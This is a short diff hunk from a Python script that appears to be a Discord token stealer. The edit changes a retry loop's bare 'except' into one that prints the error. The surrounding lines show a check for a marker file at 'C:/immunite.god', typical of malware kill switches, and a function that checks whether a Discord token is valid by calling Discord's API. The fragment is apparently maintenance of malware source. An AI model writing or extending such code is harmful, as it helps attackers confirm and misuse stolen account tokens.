@@ -241,8 +241,8 @@ if not os.path.exists('C:/immunite.god'):
                 if r.status_code == 200:
                     i+=1
                     return i
-            except: 
-                print('probably 429 error retrying in 0.1s')
+            except Exception as e: 
+                print(f'ERROR : {e}')
                 time.sleep(0.1)
     def validate_discord_token(token):
         r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
